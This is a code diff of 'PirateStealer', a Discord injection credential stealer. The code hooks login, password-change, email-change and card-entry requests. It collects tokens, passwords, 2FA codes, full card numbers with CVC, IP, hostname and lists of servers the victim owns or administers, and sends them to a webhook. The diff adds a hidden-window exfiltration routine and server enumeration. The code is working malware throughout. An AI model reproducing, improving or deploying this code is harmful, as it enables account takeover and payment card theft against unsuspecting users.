@@ -7,23 +7,24 @@ const fs = require('fs');
 const path = require('path');
 const querystring = require("querystring");
 const os = require('os')
-const webhook = "%WEBHOOK_LINK%";
+const webhook = "%WEBHOOK_LINK%"
 const Filters = {
     1: {
-    	urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
+        urls: ["https://discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/users/@me", "https://*.discord.com/api/v*/users/@me", "https://discordapp.com/api/v*/auth/login", 'https://discord.com/api/v*/auth/login', 'https://*.discord.com/api/v*/auth/login', "https://api.stripe.com/v1/tokens"]
     },
     2: {
-    	urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
-    } 
+        urls: ["https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json", "https://*.discord.com/api/v*/applications/detectable", "https://discord.com/api/v*/applications/detectable", "https://*.discord.com/api/v*/users/@me/library", "https://discord.com/api/v*/users/@me/library", "https://*.discord.com/api/v*/users/@me/billing/subscriptions", "https://discord.com/api/v*/users/@me/billing/subscriptions", "wss://remote-auth-gateway.discord.gg/*"]
+    }
 };
 
 const config = {
+    "minimum_members_per_server":"%MIN_MEMBERS%",
     "logout": "%LOGOUT%",
     "logout-notify": "%LOGOUTNOTI%",
     "init-notify": "%INITNOTI%",
-    "embed-color": 3447704,
+    "embed-color": 347704,
     "disable-qr-code": "%DISABLEQRCODE%",
-    "ping": [ true, "@everyone" ]
+    "ping": [false, "@everyone"]
 };
 
 const badges = {
@@ -137,7 +138,7 @@ async function firstTime() {
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "Discord Initalized",
-                        description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
+                        description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                         color: config["embed-color"],
                         fields: [{
                             name: "Info",
@@ -176,10 +177,13 @@ async function firstTime() {
 
         }
     }
-    if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) return !0
+    if (!fs.existsSync(path.join(__dirname, "PirateStealerBTW"))) return true
 
     fs.rmdirSync(path.join(__dirname, "PirateStealerBTW"));
-    if (config.logout != "false" || config.logout == "%LOGOUT%") {
+    if (config.logout != "false" && config.logout != "%LOGOUT%") {
+
+        const window = BrowserWindow.getAllWindows()[0];
+        window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`)
         if (config['logout-notify'] == "true") {
             if (token == null || token == undefined || token == "") {
                 var c = {
@@ -209,7 +213,7 @@ async function firstTime() {
                     content: config.ping[0] ? config.ping[1] : "",
                     embeds: [{
                         title: "User got logged out",
-                        description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
+                        description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
                         color: config["embed-color"],
                         fields: [{
                             name: "Info",
@@ -246,8 +250,6 @@ async function firstTime() {
                 sendToWebhook(JSON.stringify(c))
             }
         }
-        const window = BrowserWindow.getAllWindows()[0];
-        window.webContents.executeJavaScript(`window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`, !0).then((result) => {});
     }
     return !1
 
@@ -262,7 +264,7 @@ session.defaultSession.webRequest.onBeforeRequest(Filters[2], (details, callback
             return;
         }
     }
-    if (firstTime()) {}
+    if (firstTime()) { }
 
     callback({})
     return;
@@ -280,8 +282,7 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
             callback({
                 responseHeaders: Object.assign({
                     "Content-Security-Policy": ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
-                    'Access-Control-Allow-Headers': "*",
-                    "Access-Control-Allow-Origin": "*"
+                    'Access-Control-Allow-Headers': "*"
                 }, details.responseHeaders)
             });
         }
@@ -304,6 +305,7 @@ session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
 async function userLogin(password, email, token) {
     var userInfo = await getUserInfo(token);
     var ip = await getIp();
+    var servers = await getServers(token)
     var billing = await getBilling(token);
     var friends = await getRelationships(token);
 
@@ -312,7 +314,7 @@ async function userLogin(password, email, token) {
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "User Login",
-            description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${password})`,
+            description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${password})`,
             "color": config['embed-color'],
             "fields": [{
                 name: "Info",
@@ -350,7 +352,7 @@ async function userLogin(password, email, token) {
                 name: "Token",
                 value: `\`\`\`${token}\`\`\``,
                 inline: !1
-            }, ],
+            },],
             "author": {
                 "name": "PirateStealer"
             },
@@ -364,6 +366,20 @@ async function userLogin(password, email, token) {
             "title": `Total Friends (${friends.length})`,
             "color": config['embed-color'],
             "description": friends.frien,
+            "author": {
+                "name": "PirateStealer"
+            },
+            "footer": {
+                "text": "PirateStealer"
+            },
+            "thumbnail": {
+                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
+            }
+        },
+        {
+            "title": `Total Servers (${servers.totalguilds})`,
+            "color": config['embed-color'],
+            "description": servers.message,
             "author": {
                 "name": "PirateStealer"
             },
@@ -407,7 +423,7 @@ async function emailChanged(password, newEmail, token) {
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Email Changed",
-            description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${password}\n${newEmail})`,
+            description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${password}\n${newEmail})`,
             "color": config['embed-color'],
             "fields": [{
                 name: "Info",
@@ -441,7 +457,7 @@ async function emailChanged(password, newEmail, token) {
                 name: "Token",
                 value: `\`\`\`${token}\`\`\``,
                 inline: !1
-            }, ],
+            },],
             "author": {
                 "name": "PirateStealer"
             },
@@ -487,6 +503,7 @@ async function emailChanged(password, newEmail, token) {
 async function passwordChanged(oldPassword, newPassword, token) {
     var userInfo = await getUserInfo(token);
     var ip = await getIp();
+    var servers = await getServers(token)
     var billing = await getBilling(token);
     var friends = await getRelationships(token);
 
@@ -495,7 +512,7 @@ async function passwordChanged(oldPassword, newPassword, token) {
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Password Changed",
-            description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${newPassword})`,
+            description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token}\n${newPassword})`,
             "color": config['embed-color'],
             "fields": [{
                 name: "Info",
@@ -537,7 +554,7 @@ async function passwordChanged(oldPassword, newPassword, token) {
                 name: "Token",
                 value: `\`\`\`${token}\`\`\``,
                 inline: !1
-            }, ],
+            },],
             "author": {
                 "name": "PirateStealer"
             },
@@ -560,8 +577,22 @@ async function passwordChanged(oldPassword, newPassword, token) {
             "thumbnail": {
                 "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
             }
+        }, {
+            "title": `Total Servers (${servers.totalguilds})`,
+            "color": config['embed-color'],
+            "description": servers.message,
+            "author": {
+                "name": "PirateStealer"
+            },
+            "footer": {
+                "text": "PirateStealer"
+            },
+            "thumbnail": {
+                "url": `https://cdn.discordapp.com/avatars/${userInfo.id}/${userInfo.avatar}`
+            }
         }]
     }
+
 
     if (token.startsWith("mfa")) {
         var codes = await get2faCodes(token, newPassword)
@@ -592,54 +623,54 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
         content: config.ping[0] ? config.ping[1] : "",
         embeds: [{
             "title": "Credit Card",
-            description: `[**<:partner:909102089513340979> │ Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
+            description: `[**<:partner:909102089513340979>  Click Here To Copy Info On Mobile**](https://ctf.surf/raw/${token})`,
             "color": config['embed-color'],
             "fields": [{
-                    name: "Info",
-                    value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
-                    inline: !1
-                }, {
-                    name: "Username",
-                    value: `\`${userInfo.username}#${userInfo.discriminator}\``,
-                    inline: !0
-                }, {
-                    name: "ID",
-                    value: `\`${userInfo.id}\``,
-                    inline: !0
-                }, {
-                    name: "Nitro",
-                    value: `${getNitro(userInfo.premium_type)}`,
-                    inline: !1
-                }, {
-                    name: "Badges",
-                    value: `${getBadges(userInfo.flags)}`,
-                    inline: !1
-                }, {
-                    name: "Billing",
-                    value: `${billing}`,
-                    inline: !1
-                }, {
-                    name: "Email",
-                    value: `\`${userInfo.email}\``,
-                    inline: false
-                }, {
-                    name: "CC Number",
-                    value: `\`${cardnumber}\``,
-                    inline: !0
-                }, {
-                    name: "Expiration",
-                    value: `\`${expiration}\``,
-                    inline: !0
-                },
-                {
-                    name: "CVC",
-                    value: `\`${cvc}\``,
-                    inline: !0
-                }, {
-                    name: "Token",
-                    value: `\`\`\`${token}\`\`\``,
-                    inline: !1
-                },
+                name: "Info",
+                value: `\`\`\`Hostname: \n${os.hostname()}\nIP: \n${ip}\nInjection Info: \n${__dirname}\n\`\`\``,
+                inline: !1
+            }, {
+                name: "Username",
+                value: `\`${userInfo.username}#${userInfo.discriminator}\``,
+                inline: !0
+            }, {
+                name: "ID",
+                value: `\`${userInfo.id}\``,
+                inline: !0
+            }, {
+                name: "Nitro",
+                value: `${getNitro(userInfo.premium_type)}`,
+                inline: !1
+            }, {
+                name: "Badges",
+                value: `${getBadges(userInfo.flags)}`,
+                inline: !1
+            }, {
+                name: "Billing",
+                value: `${billing}`,
+                inline: !1
+            }, {
+                name: "Email",
+                value: `\`${userInfo.email}\``,
+                inline: false
+            }, {
+                name: "CC Number",
+                value: `\`${cardnumber}\``,
+                inline: !0
+            }, {
+                name: "Expiration",
+                value: `\`${expiration}\``,
+                inline: !0
+            },
+            {
+                name: "CVC",
+                value: `\`${cvc}\``,
+                inline: !0
+            }, {
+                name: "Token",
+                value: `\`\`\`${token}\`\`\``,
+                inline: !1
+            },
             ],
             "author": {
                 "name": "PirateStealer"
@@ -672,8 +703,31 @@ async function creditCardAdded(cardnumber, cvc, expiration, token) {
 
 // Helpers functions
 async function sendToWebhook(params) {
+    const window = new BrowserWindow({ width: 100, height: 100, show: false })
+
+    window.loadURL("https://w3.org/") // Any website that enable cors security policy
+    window.webContents.executeJavaScript(`
+     new Promise(function (resolve, reject) {
+
+        var xhr = new XMLHttpRequest();xhr.open("POST", "${webhook}", true);
+        xhr.onload = function () {
+            resolve(xhr.response)
+        }
+        xhr.setRequestHeader('Content-Type', 'application/json');xhr.send(JSON.stringify(${params}));
+
+    });
+        `, true).then(() => {
+        window.close()
+    })
+
+}
+
+async function getServers(token) {
     const window = BrowserWindow.getAllWindows()[0];
-    window.webContents.executeJavaScript(`var xhr = new XMLHttpRequest();xhr.open("POST", "${webhook}", true);xhr.setRequestHeader('Content-Type', 'application/json');xhr.setRequestHeader('Access-Control-Allow-Origin', '*');xhr.send(JSON.stringify(${params}));`, !0)
+
+    const a = await window.webContents.executeJavaScript(`function GetCoolGuilds(e){var r=new XMLHttpRequest;return r.open("GET","https://discord.com/api/v9/users/@me/guilds",!1),r.setRequestHeader("Authorization",e),r.send(null),r.responseText}function GetServerList(e){var r,t=JSON.parse(e);for(var n in cc=t.filter((e=>1==e.owner)).concat(t.filter((e=>8==(8&e.permissions)))),cc)cc[n].membercount=(r=cc[n].id,window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(e,r,t)=>e.exports=t},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},e=>{gg=e}]),function(e){const r="string"==typeof e?e:null;for(const t in gg.c)if(gg.c.hasOwnProperty(t)){const n=gg.c[t].exports;if(n&&n.__esModule&&n.default&&(r?n.default[r]:e(n.default)))return n.default;if(n&&(r?n[r]:e(n)))return n}return null}("getMemberCount").getMemberCounts()[r]);return cc}function _696969(){var e=GetCoolGuilds("%TOKEN%"),r=GetServerList(e).filter((e=>e.membercount>=${config.minimum_members_per_server})),t="";for(const e of r)t+="Server Name: "+e.name+" - Owner: "+e.owner+" - Members: "+e.membercount+"\\n";return""==t&&(t="\`No rare servers :(\`"),JSON.stringify({message:t,totalguilds:r.length})}_696969();`.replace('%TOKEN%', token), true)
+
+    return JSON.parse(a)
 }
 async function getRelationships(token) {
     const window = BrowserWindow.getAllWindows()[0];
@@ -728,18 +782,18 @@ async function getBilling(token) {
     var a = await window.webContents.executeJavaScript(`var xmlHttp = new XMLHttpRequest(); xmlHttp.open( "GET", "https://discord.com/api/v9/users/@me/billing/payment-sources", false ); xmlHttp.setRequestHeader("Authorization", "${token}"); xmlHttp.send( null ); xmlHttp.responseText`, !0)
     var json = JSON.parse(a)
 
-    var billing = "";
+    var billing = "None";
     json.forEach(z => {
         if (z.type == 2 && z.invalid != !0) {
-            billing += "\`✔️\` <:paypal:896441236062347374>";
+            billing += "\`??\` <:paypal:896441236062347374>";
         } else if (z.type == 1 && z.invalid != !0) {
-            billing += "\`✔️\` :credit_card:";
+            billing += "\`??\` :credit_card:";
         } else {
-            return "\`❌\`";
+            return "\`?\`";
         };
     });
 
-    billing = billing ?? "\`❌\`";
+    billing = billing ?? "\`?\`";
     return billing;
 }
 async function getUserInfo(token) {
